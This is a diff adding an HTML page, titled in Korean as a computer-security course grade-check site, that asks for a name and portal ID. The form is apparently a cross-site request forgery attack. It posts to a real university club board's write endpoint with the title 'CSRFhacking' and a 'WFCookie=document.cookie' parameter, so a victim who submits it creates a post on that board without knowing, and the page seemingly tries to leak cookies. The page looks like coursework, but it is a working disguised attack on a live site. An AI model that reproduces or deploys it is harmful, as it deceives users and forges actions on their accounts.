@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[컴퓨터 보안] 성적 확인 사이트</title>
+   
+</head>
+
+<style>
+    body {
+        text-align: center;
+        width: 80%;
+        margin-left: auto;
+        margin-right: auto;
+        margin-top: 3%;
+    }
+    .header {
+        padding: 15px;
+        margin: 10px;
+        font-size: 17px;
+    }
+    button{
+        margin: 10px;
+    }
+</style>
+
+
+<body>
+    <div class="header">
+        컴퓨터 보안 성적 확인 사이트
+    </div>
+    <div class="cont">
+        <form
+            action='http://club.uos.ac.kr/service/rgboard/RGBoard.jsp?reply_seq=&viewtype=&page=1&brd_seq=415218&exec=write_proc&imgFileList=&imgFileValue=&useType=&fdValue_0=&fdValue_1=&fdValue_2=&fdValue_3=&fdValue_4=&title=CSRFhacking&passwd=&fdFlagCount=0&ir1=&WFCookie=document.cookie&file_count=0&clip_flag=Y'
+            method="post" accept-charset="euc-kr">
+            <div class="info">
+                <input type="text" name="writername" placeholder="이름">
+            </div>
+            <div class="info">
+                <input type="text" name="noteContent" placeholder="포털 아이디">
+            </div>
+            
+            <button id="button1">입력</button>
+        </form>
+    </div>
+
+    <script>
+        window.onload = function () {
+            document.charset = "euc-kr";
+            cert_page();
+        }
+    </script>
+</body>
+
+</html>
